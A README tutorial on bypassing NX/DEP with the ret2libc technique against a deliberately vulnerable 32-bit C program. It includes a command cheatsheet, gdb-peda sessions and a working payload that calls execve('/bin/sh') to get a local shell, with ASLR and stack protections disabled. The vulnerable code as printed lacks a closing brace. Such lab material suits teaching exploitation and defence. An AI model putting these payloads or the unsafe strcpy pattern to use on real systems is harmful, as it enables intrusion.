README
======

#### CHEATSHEET:
`$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

`$ gcc nx_bypass.c -o nx_bypass -fno-stack-protector -Wl,-z,norelro -no-pie -m32`

`$ p system`

`$ p execve`

`$ p exit`

`$ find /bin/sh`

`$ disass main`

`$ disass FaiCose`

`$ b *address`

`$ r AAAA`

`$ r $(python -c 'print "A"*36 + "\xe0\x8f\xe9\xf7"')`

`$ x/64wx $esp`

`$ python -c 'print "A"*52 + "\xe0\x8f\xe9\xf7" + "\xb0\x5e\xe0\xf7" + "\x2d\xb4\xf5\xf7" + "\x78\x81\x04\x08" + "\x78\x81\x04\x08"' > tmp.txt`

```$ ./nx_bypass `<tmp.txt` ```



#### VULNERABLE CODE:
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int FaiCose(const char* buffer)
{
  char buf[40];
  strcpy(buf, buffer);
  printf("You wrote: %s\n", buf);
  return 0;


int main(int argc, const char* argv[]) 
{
  if(argc != 2)
  {
    printf("Usage %s <text>\n", argv[0]);
    exit(1);
  }
  FaiCose(argv[1]);
  return 0;
}
```


# Bypass NX (DEP) Techniques
DEP stands for Data Execution Prevention which makes the stack not executable thanks to the NX bit (AMD arch) or XD bit (Intel arch).
This protection will prevent the execution of the code present inside the stack after a buffer overflow occurs. This means that the program will
crash with SIGSEGV and your shellcode won't be executed.
 
## x32
### ret2libc
This is a technique to bypass NX and stands for return to libc. The purpose of this technique is to call a function present inside the standard C library.
Libc is the standard C Library in Linux, which is present on all systems by default and contains some basic functions required by programs to run properly.
Possible functions to be used are: system, execl, execle, exelp, execv, execve, etc.

Libc is mapped into memory during the execution of the program, it can be seen inside gdb running the following command:

`$ vmmap libc`

```
Start      End        Perm	Name
0xf7dce000 0xf7deb000 r--p	/usr/lib32/libc-2.30.so
0xf7deb000 0xf7f42000 r-xp	/usr/lib32/libc-2.30.so
0xf7f42000 0xf7fb2000 r--p	/usr/lib32/libc-2.30.so
0xf7fb2000 0xf7fb4000 r--p	/usr/lib32/libc-2.30.so
0xf7fb4000 0xf7fb6000 rw-p	/usr/lib32/libc-2.30.so
```

To move forward, below are listed the main steps to follow:

1. Find system function address inside libc in memory

`$ p system`

2. Find exit function address inside libc in memory

`$ p exit`

3. Find /bin/sh string inside libc in memory

`$ find /bin/sh`

Make sure any of the found addresses doesn't have null bytes \x00 if strcpy is going to be exploited. The space \x20 will cause trouble though, because a space will split our argument into two arguments and our vulnerable program won't accept them.

The basic of buffer overflow says that if you can control the instruction pointer register (EIP) then you can control the execution of the program.

So first of all check if you can control EIP register (to know how check basic BOF tutorials, here it won't be covered).
Once you have found the offset to control the EIP register, since you cannot put your shellcode inside the stack (which it's not executable, remember?) you will overwrite EIP address with the address of the found libc system function (that's why ret2libc). In this way you will redirect the program to a function already present in memory.

Things to note here:
system function needs an argument which will be the program we want to execute, in this case /bin/sh (not the string itself but the address containing the string). This is why we will search for /bin/sh string inside memory.

### Payload analysis
The payload to bypass NX will have the following structure:

`padding + system + exit + /bin/sh`

Where /bin/sh is the argument of system("/bin/sh") function.

Things to note here:
A call to a function will push the return address into the stack. The return address is the instruction just after the call to a function, so in this case, the 4 bytes after our controlled EIP address. That's why exit() function is placed just after system() in our payload.

#### Why
During a function call the arguments of the function will be pushed into the stack, then calling a function will push automatically the return address into the stack so the program know where to go after the function has been executed.

Let's run nx_bypass inside gdb, take a look at our FaiCose function and set a breakpoint to the strcpy call.
Note that I am using a compiled 32 bit program inside 64 bit Linux VM.

```
gdb-peda$ disass FaiCose
Dump of assembler code for function FaiCose:
   0x080491d6 <+0>:	endbr32 
   0x080491da <+4>:	push   ebp
   0x080491db <+5>:	mov    ebp,esp
   0x080491dd <+7>:	push   ebx
   0x080491de <+8>:	sub    esp,0x34
   0x080491e1 <+11>:	call   0x8049110 <__x86.get_pc_thunk.bx>
   0x080491e6 <+16>:	add    ebx,0x20d2
   0x080491ec <+22>:	sub    esp,0x8
   0x080491ef <+25>:	push   DWORD PTR [ebp+0x8]
   0x080491f2 <+28>:	lea    eax,[ebp-0x30]
   0x080491f5 <+31>:	push   eax
   *0x080491f6 <+32>:	call   0x8049090 <strcpy@plt>
   **0x080491fb <+37>:	add    esp,0x10
   0x080491fe <+40>:	sub    esp,0x8
   0x08049201 <+43>:	lea    eax,[ebp-0x30]
   0x08049204 <+46>:	push   eax
   0x08049205 <+47>:	lea    eax,[ebx-0x12b0]
   0x0804920b <+53>:	push   eax
   0x0804920c <+54>:	call   0x8049080 <printf@plt>
   0x08049211 <+59>:	add    esp,0x10
   0x08049214 <+62>:	mov    eax,0x0
   0x08049219 <+67>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804921c <+70>:	leave  
   0x0804921d <+71>:	ret 

```
*Breakpoint

**Return address of the call to strcpy

Let's set a breakpoint at the strcpy call 0x080491f6 and the return address

`$ b *0x080491f6`

`$ b *0x080491fb`

Let's run the program and examine the stack.

`$ r AAAA`

```
-------------------------------------code-------------------------------------]
   0x80491ef <FaiCose+25>:	push   DWORD PTR [ebp+0x8]
   0x80491f2 <FaiCose+28>:	lea    eax,[ebp-0x30]
   0x80491f5 <FaiCose+31>:	push   eax
=> 0x80491f6 <FaiCose+32>:	call   0x8049090 <strcpy@plt>
   0x80491fb <FaiCose+37>:	add    esp,0x10
   0x80491fe <FaiCose+40>:	sub    esp,0x8
   0x8049201 <FaiCose+43>:	lea    eax,[ebp-0x30]
   0x8049204 <FaiCose+46>:	push   eax
Guessed arguments:
arg[0]: 0xffffd0d8 --> 0xf7fb4000 --> 0x1e5d6c 
arg[1]: 0xffffd3c8 ("AAAA")
[------------------------------------stack-------------------------------------]
ESP => 0000| 0xffffd0c0 --> 0xffffd0d8 --> 0xf7fb4000 --> 0x1e5d6c 
       0004| 0xffffd0c4 --> 0xffffd3c8 ("AAAA")
       0008| 0xffffd0c8 --> 0xf7ffd000 --> 0x29f38 
       0012| 0xffffd0cc --> 0x80491e6 (<FaiCose+16>:	add    ebx,0x20d2)
       0016| 0xffffd0d0 --> 0x0 
       0020| 0xffffd0d4 --> 0xffffd1d4 --> 0xffffd388 ("/path/path/nx_bypass")
       0024| 0xffffd0d8 --> 0xf7fb4000 --> 0x1e5d6c 
       0028| 0xffffd0dc --> 0xf7fb2a60 (0xf7fb2a60)
[------------------------------------------------------------------------------]

```
As we can see the two arguments of strcpy have been pushed inside the stack. Note that we still have to run the call instruction. (I manually added "ESP =>" note above)

`strcpy(buf, argv[1]);`

The first argument is at 0000 inside the stack frame and it corresponds to the buf variable in our code.
The second argument is at 0004 and it's the string we passed to the program (argv[1]).

If we step into the call we will see that the return address 0x80491fb (aka where the program goes after the call instruction have been completed) will be pushed into the stack and at this point the stack will look like this:

0000 | return addr |
-----|-------------|
0004 | argument 1  |
0008 | argument 2  |

The first row above is ESP register.


```
gdb-peda$ si
[----------------------------------registers-----------------------------------]
EAX: 0xffffd0d8 --> 0xf7fb4000 --> 0x1e5d6c 
EBX: 0x804b2b8 --> 0x804b1cc --> 0x1 
ECX: 0xffffd140 --> 0x2 
EDX: 0xffffd164 --> 0x0 
ESI: 0xf7fb4000 --> 0x1e5d6c 
EDI: 0xf7fb4000 --> 0x1e5d6c 
EBP: 0xffffd108 --> 0xffffd128 --> 0x0 
ESP: 0xffffd0bc --> 0x80491fb (<FaiCose+37>:	add    esp,0x10)
EIP: 0x8049090 (<strcpy@plt>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049080 <printf@plt>:	endbr32 
   0x8049084 <printf@plt+4>:	jmp    DWORD PTR ds:0x804b2c4
   0x804908a <printf@plt+10>:	nop    WORD PTR [eax+eax*1+0x0]
=> 0x8049090 <strcpy@plt>:	endbr32 
   0x8049094 <strcpy@plt+4>:	jmp    DWORD PTR ds:0x804b2c8
   0x804909a <strcpy@plt+10>:	nop    WORD PTR [eax+eax*1+0x0]
   0x80490a0 <exit@plt>:	endbr32 
   0x80490a4 <exit@plt+4>:	jmp    DWORD PTR ds:0x804b2cc
[------------------------------------stack-------------------------------------]
0000| 0xffffd0bc --> 0x80491fb (<FaiCose+37>:	add    esp,0x10)
0004| 0xffffd0c0 --> 0xffffd0d8 --> 0xf7fb4000 --> 0x1e5d6c 
0008| 0xffffd0c4 --> 0xffffd3c8 ("AAAA")
0012| 0xffffd0c8 --> 0xf7ffd000 --> 0x29f38 
0016| 0xffffd0cc --> 0x80491e6 (<FaiCose+16>:	add    ebx,0x20d2)
0020| 0xffffd0d0 --> 0x0 
0024| 0xffffd0d4 --> 0xffffd1d4 --> 0xffffd388 ("/mnt/tools/binary/binary_exploitation/linux/nx_bypass/nx_bypass")
0028| 0xffffd0d8 --> 0xf7fb4000 --> 0x1e5d6c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08049090 in strcpy@plt ()

```

Now if we continue the execution it will be resumed after the strcpy function 0x80491fb, aka the return address of the strcpy call. The execution is stopped because of the breakpoint.

```
gdb-peda$ c
Continuing.
[-------------------------------------code-------------------------------------]
   0x80491f2 <FaiCose+28>:	lea    eax,[ebp-0x30]
   0x80491f5 <FaiCose+31>:	push   eax
   0x80491f6 <FaiCose+32>:	call   0x8049090 <strcpy@plt>
=> 0x80491fb <FaiCose+37>:	add    esp,0x10
   0x80491fe <FaiCose+40>:	sub    esp,0x8
   0x8049201 <FaiCose+43>:	lea    eax,[ebp-0x30]
   0x8049204 <FaiCose+46>:	push   eax
   0x8049205 <FaiCose+47>:	lea    eax,[ebx-0x12b0]

```

This is why our payload will look like padding + system + return address + argument. At the moment we are able to overwrite EIP with system() function address, it's like we are calling the function so the following 4 bytes will be pushed into the stack as the return address together with the argument (+8 bytes from EIP)

### Exploitation

Let's try to trigger the buffer overflow and examine the stack, but first add a breakpoint just after the call to strcpy.

```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e13220 <system>
```

As we can see above, system() address has \x20 byte which is a space. If we try to build our payload with this address we will have something like this:

`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 2��`

Our program will think we are passing two arguments and wil stop the execution. Let's try execve instead:

```
gdb-peda$ p execve
$2 = {<text variable, no debug info>} 0xf7e98fe0 <execve>
```

```
gdb-peda$ p exit
$3 = {<text variable, no debug info>} 0xf7e05eb0 <exit>
```

```
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f5b42d ("/bin/sh")
```

Now we have almost everything to build our payload. Almost because we switched to execve() function, let's see how it works:

```
$ man execve
int execve(const char *pathname, char *const argv[], har *const envp[]);
```

It takes 3 arguments, pathname must be either a binary executable or a script. We miss 2 arguments that can be 0 both.

```
gdb-peda$ find 0x00000000
Searching for '0x00000000' in: None ranges
Found 70499 results, display max 256 items:
[..CUT..]
nx_bypass : 0x8048178 --> 0x0 
[..CUT..]
```
There are many 0's, I just pick 0x8048178, just take one, avoid null bytes and spaces.

Now we have everything to build our payload!

```
$ python -c 'print "A"*52 + "\xe0\x8f\xe9\xf7" + "\xb0\x5e\xe0\xf7" + "\x2d\xb4\xf5\xf7" + "\x78\x81\x04\x08" + "\x78\x81\x04\x08"'
```

Before we try, we add a breakpoint at the return of FaiCose function.

```
gdb-peda$ disass FaiCose
Dump of assembler code for function FaiCose:
[..CUT..]
   0x0804920c <+54>:	call   0x8049080 <printf@plt>
   0x08049211 <+59>:	add    esp,0x10
   0x08049214 <+62>:	mov    eax,0x0
   0x08049219 <+67>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804921c <+70>:	leave  
   *0x0804921d <+71>:	ret    
End of assembler dump.

gdb-peda$ b *0x0804921d
Breakpoint 3 at 0x804921d
```

Let's examine the stack at that point.

```
gdb-peda$ r $(python -c 'print "A"*52 + "\xe0\x8f\xe9\xf7" + "\xb0\x5e\xe0\xf7" + "\x2d\xb4\xf5\xf7" + "\x78\x81\x04\x08" + "\x78\x81\x04\x08"')

gdb-peda$ c
Continuing.
You wrote: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����^��-���xx�
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414141 ('AAAA')
ECX: 0x7fffffac 
EDX: 0x804a016 --> 0x61735500 ('')
ESI: 0xf7fb4000 --> 0x1e5d6c 
EDI: 0xf7fb4000 --> 0x1e5d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd0cc --> 0xf7e98fe0 (<execve>:	endbr32)
EIP: 0x804921d (<FaiCose+71>:	ret)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049214 <FaiCose+62>:	mov    eax,0x0
   0x8049219 <FaiCose+67>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x804921c <FaiCose+70>:	leave  
=> 0x804921d <FaiCose+71>:	ret    
   0x804921e <main>:	endbr32 
   0x8049222 <main+4>:	lea    ecx,[esp+0x4]
   0x8049226 <main+8>:	and    esp,0xfffffff0
   0x8049229 <main+11>:	push   DWORD PTR [ecx-0x4]
[------------------------------------stack-------------------------------------]
0000| 0xffffd0cc --> 0xf7e98fe0 (<execve>:	endbr32)
0004| 0xffffd0d0 --> 0xf7e05eb0 (<exit>:	endbr32)
0008| 0xffffd0d4 --> 0xf7f5b42d ("/bin/sh")
0012| 0xffffd0d8 --> 0x8048178 --> 0x0 
0016| 0xffffd0dc --> 0x8048178 --> 0x0 
0020| 0xffffd0e0 --> 0xffffd100 --> 0x2 
0024| 0xffffd0e4 --> 0x0 
0028| 0xffffd0e8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x0804921d in FaiCose ()

```

Look at the stack! The ret instruction is going to call execve, 4 bytes away there is the exit function which will be the return function of our execve and in the end the arguments of execve! Our shellcode is going to work!

```
gdb-peda$ c
Continuing.
process 82635 is executing new program: /usr/bin/dash

[1]+  Stopped                 gdb ./nx_bypass
```

Let's try outside of gdb:

```
python -c 'print "A"*52 + "\xe0\x8f\xe9\xf7" + "\xb0\x5e\xe0\xf7" + "\x2d\xb4\xf5\xf7" + "\x78\x81\x04\x08" + "\x78\x81\x04\x08"' > tmp.txt
```

```
$ ./nx_bypass `<tmp.txt`
You wrote: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����^��-���xx�
$ whoami
andrea
```








